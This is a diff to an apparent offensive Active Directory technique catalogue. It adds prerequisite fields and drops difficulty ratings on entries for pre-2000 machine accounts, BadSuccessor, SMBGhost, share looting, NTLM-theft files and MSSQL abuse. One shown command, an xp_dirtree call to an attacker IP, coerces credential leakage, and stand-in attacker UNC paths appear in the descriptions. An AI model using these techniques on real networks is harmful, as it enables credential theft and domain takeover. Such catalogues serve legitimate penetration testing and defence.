@@ -16,6 +16,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     id: 'pre2k-auth',
     label: 'Pre-Windows 2000 Computer Accounts',
     phase: 'initial-access',
+    needs: 'none',
     summary: "Pre-staged computer accounts keep a predictable password (lowercased name) until first boot.",
     description:
       "A computer account pre-created with the 'pre-Windows 2000' flag gets an initial password equal to its own name in lowercase (e.g. WS01$ -> 'ws01'), truncated to 14 chars. Until that machine first boots and rotates its password, anyone who can enumerate these stale objects (WORKSTATION_TRUST_ACCOUNT with logonCount 0 / low pwdLastSet) can authenticate as the computer and request a TGT, a quiet foothold for further enumeration and delegation abuse.",
@@ -34,12 +35,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['Ability to enumerate domain objects (any account; sometimes anonymous)', 'A pre-staged computer object that has never logged on'],
     opsec: 'Spray-like Kerberos pre-auth failures (4771) across many computer names are detectable; a successful logon as a dormant machine account is anomalous. Quiet compared to most footholds.',
-    difficulty: 'easy',
   },
   {
     id: 'badsuccessor-dmsa',
     label: 'BadSuccessor (dMSA Abuse)',
     phase: 'priv-esc',
+    needs: 'domain-user',
     summary: 'Abuse delegated Managed Service Accounts on Server 2025 to inherit a target principal’s SIDs.',
     description:
       "Windows Server 2025 adds delegated Managed Service Accounts (dMSAs) with a migration mechanism. With CreateChild on any OU (or write over a dMSA), an attacker points msDS-ManagedAccountPrecededByLink at a target (e.g. a Domain Admin) and flips msDS-DelegatedMSAState. The KDC then mints the dMSA a PAC carrying the target's SIDs, succeeding the victim without touching their group membership or password. A single Server 2025 DC makes it viable (CVE-2025-53779).",
@@ -62,12 +63,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     opsec: 'New dMSA objects and changes to msDS-ManagedAccountPrecededByLink / msDS-DelegatedMSAState are high-signal once detections exist (4662/5136). Stealthy where dMSA auditing is absent.',
     versions: ['srv2025'],
     affects: 'Server 2025 only; dMSAs are a Windows Server 2025 feature.',
-    difficulty: 'medium',
   },
   {
     id: 'smbghost',
     label: 'SMBGhost (CVE-2020-0796)',
     phase: 'priv-esc',
+    needs: 'none',
     summary: 'Integer overflow in SMBv3.1.1 compression → kernel RCE / local SYSTEM.',
     description:
       "CVE-2020-0796 ('SMBGhost' / 'CoronaBlue') is a buffer overflow in the SMBv3.1.1 compression handler on Windows 10 / Server 1903-1909. A crafted compressed packet corrupts kernel memory for remote SYSTEM code execution; it is also a reliable local privilege escalation to SYSTEM. A peer of EternalBlue/ZeroLogon for unpatched legacy hosts.",
@@ -87,12 +88,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     opsec: 'The kernel exploit is crash-prone (BSOD on failure) and loud; the vuln check itself is a benign protocol negotiation. Patched everywhere current, so legacy-host only.',
     versions: ['win10-1903', 'win10-1909'],
     affects: 'Windows 10 / Server 1903-1909 only; the SMBv3.1.1 compression handler shipped in build 1903 and the bug was patched out of later builds.',
-    difficulty: 'hard',
   },
   {
     id: 'smb-share-loot',
     label: 'SMB Share Spidering & Looting',
     phase: 'credential-access',
+    needs: 'domain-user',
     summary: 'Crawl readable shares for passwords, configs, scripts, keys and backups.',
     description:
       'Open and over-shared SMB folders routinely hold credentials: scripts with embedded passwords, unattend.xml / web.config / .kdbx / .ppk / .pem files, runbooks and backups. With any domain creds, recursively spider every readable share, keyword/regex the names and contents, and pull hits. A low-skill, high-yield staple.',
@@ -114,12 +115,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['Any domain credentials with read access to one or more shares'],
     opsec: 'Mass file reads generate object-access events (5145) and are noisy at scale; targeted pattern searches are quieter.',
-    difficulty: 'easy',
   },
   {
     id: 'ntlm-theft-files',
     label: 'NTLM Theft via Malicious Files',
     phase: 'credential-access',
+    needs: 'domain-user',
     summary: 'Plant LNK/SCF/.searchConnector-ms files on writable shares so browsing users leak NetNTLM.',
     description: r`With write access to a frequented share, drop files whose icon/resource path points at an attacker UNC (\\attacker\share). When a user merely browses the folder in Explorer, Windows resolves the icon and authenticates to the attacker host, leaking the user's NetNTLMv2 to crack offline or relay. NetExec automates planting across writable shares (slinky=.lnk, scuffy=.scf, drop-sc=.searchConnector-ms, drop-library-ms=.library-ms / CVE-2025-24054); pair with Responder/ntlmrelayx.`,
     tools: [
@@ -139,12 +140,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['Write access to a share that users browse', 'A listener (Responder / ntlmrelayx) to catch the auth'],
     opsec: 'Passive trap: it depends on a victim browsing the folder, but is very stealthy to plant. The captured auth (then crack or relay) is the higher-signal follow-on. Remember CLEANUP.',
-    difficulty: 'easy',
   },
   {
     id: 'mssql-impersonation',
     label: 'MSSQL Impersonation Privesc',
     phase: 'priv-esc',
+    needs: 'none',
     summary: 'Abuse EXECUTE AS / IMPERSONATE grants to climb from a low-priv login to sysadmin (sa).',
     description:
       'SQL Server logins are often granted IMPERSONATE on higher-privileged principals (or db-chaining lets you EXECUTE AS another user). Enumerate who you can impersonate; if a path reaches a sysadmin, assume that context and you own the instance; then xp_cmdshell to SYSTEM on the host, or pivot via linked servers.',
@@ -165,12 +166,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['A valid SQL login (SQL or Windows auth) with IMPERSONATE / EXECUTE AS grants'],
     opsec: 'Impersonation and xp_cmdshell enablement are auditable SQL events; xp_cmdshell to SYSTEM is the loud part.',
-    difficulty: 'medium',
   },
   {
     id: 'app-config-secrets',
     label: 'Stored App Credential Extraction',
     phase: 'credential-access',
+    needs: 'local-admin',
     summary: 'Decrypt creds saved by admin tooling: mRemoteNG, Veeam, PuTTY, WinSCP, RDCMan.',
     description:
       'Admin workstations and jump boxes hoard reusable credentials inside connection-manager and backup tooling. mRemoteNG stores confCons.xml under a known static key (trivially decrypted); Veeam keeps backup-job creds in a local DB recoverable with admin rights; PuTTY/WinSCP/RDCMan/MobaXterm cache session secrets in the registry or profile files. These often yield service or domain-admin creds.',
@@ -190,12 +191,12 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     requires: ['Local admin / SYSTEM on the host holding the app config (some app files are user-readable)'],
     opsec: 'Reading config files / the Veeam DB is far quieter than touching LSASS and bypasses EDR LSASS focus. High-yield against admin jump boxes.',
-    difficulty: 'easy',
   },
   {
     id: 'mssql-coerce',
     label: 'MSSQL NTLM Coercion',
     phase: 'credential-access',
+    needs: 'none',
     summary: 'Make the SQL service authenticate to you via xp_dirtree.',
     description:
       "Any MSSQL login, even a low-privileged one, can call xp_dirtree, xp_fileexist or xp_subdirs against an attacker UNC path (\\\\attacker\\share), forcing the SQL Server service account to authenticate over SMB. Capture the NetNTLM to crack offline, or relay it (to LDAP for RBCD, to ADCS, or to another SQL host). A quiet way to turn read-only database access into the service account's credentials. These are stored procedures enabled by default that need no elevated role.",
@@ -212,7 +213,6 @@ SQL> EXEC master..xp_dirtree '\\10.0.0.66\share',1,1`, lang: 'bash' },
     requires: ['Any MSSQL login (sysadmin not required)', 'A listener (Responder / ntlmrelayx) to catch the auth', 'MSSQL (1433) reachable'],
     mitre: mitre('T1187'),
     opsec: 'xp_dirtree is enabled by default and needs no elevated role: very low-friction. The outbound SMB from the SQL host to an unusual IP is the main signal; have your capture/relay listener running first.',
-    difficulty: 'easy',
     references: [
       { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
     ],
